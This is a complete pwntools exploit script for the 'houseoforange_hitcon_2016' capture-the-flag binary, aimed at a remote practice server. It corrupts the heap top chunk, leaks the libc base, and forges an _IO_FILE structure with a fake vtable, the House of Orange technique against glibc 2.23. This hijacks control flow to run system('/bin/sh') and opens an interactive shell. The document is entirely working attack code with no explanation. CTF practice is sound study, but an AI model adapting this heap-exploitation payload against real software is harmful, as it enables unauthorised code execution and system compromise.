from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('houseoforange_hitcon_2016')
io = remote('node4.buuoj.cn', 27869)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('houseoforange_hitcon_2016')


def add(size, name):
    io.sendlineafter('Your choice : ', '1')
    io.sendlineafter('Length of name :', str(size))
    io.sendafter('Name :', name)
    io.sendlineafter('Price of Orange:', '1')
    io.sendlineafter('Color of Orange:', '1')


def show():
    io.sendlineafter('Your choice : ', '2')
    io.recvuntil('Name of house : ')
    return io.recvline()[:-1]


def edit(size, name):
    io.sendlineafter('Your choice : ', '3')
    io.sendlineafter('Length of name :', str(size))
    io.sendafter('Name:', name)
    io.sendlineafter('Price of Orange: ', '1')
    io.sendlineafter('Color of Orange: ', '1')


def leak():
    global libc_base
    add(0x10, 'a')
    payload = b'a' * 0x30 + p64(0) + p64(0xfa1)
    edit(0x40, payload)
    add(0x1000, 'b')
    add(0x400, 'c' * 8)
    libc_base = u64(show()[8:].ljust(8, b'\x00')) - libc.sym['__malloc_hook'] - 0x678
    log.success('libc_base :' + hex(libc_base))


def pwn():
    # gdb.attach(io)
    # pause()
    system = libc_base + libc.sym['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh\00'))
    _IO_list_all = libc_base + libc.sym['_IO_list_all']
    _IO_str_jumps = libc_base + libc.sym['_IO_file_jumps'] + 0xc0
    fake_vtable = _IO_str_jumps - 8
    
    _IO_FILE = p64(0) + p64(0x61)               # change unsorted_bin->size to put it in smallbins(0x60)
    _IO_FILE += p64(0) + p64(_IO_list_all - 0x10)       # fake bk to unsorted_bin attack
    _IO_FILE += p64(0) + p64(1)                         # _IO_write_base _IO_write_ptr
    _IO_FILE = _IO_FILE.ljust(0x38, b'\x00')
    _IO_FILE += p64(bin_sh)                             # _IO_buf_base
    _IO_FILE = _IO_FILE.ljust(0xc0, b'\x00')
    _IO_FILE += p64(0)                                  # _mode
    _IO_FILE = _IO_FILE.ljust(0xd8, b'\x00')
    _IO_FILE += p64(fake_vtable)                        # vtable
    _IO_FILE = _IO_FILE.ljust(0xe8, b'\x00')
    _IO_FILE += p64(system)                             # _IO_buf_base
    payload = b'c' * 0x420 + _IO_FILE                   # _s._free_buffer
    edit(0x510, payload)
    io.sendlineafter('Your choice : ', '1')
    io.interactive()


if __name__ == '__main__':
    leak()
    pwn()
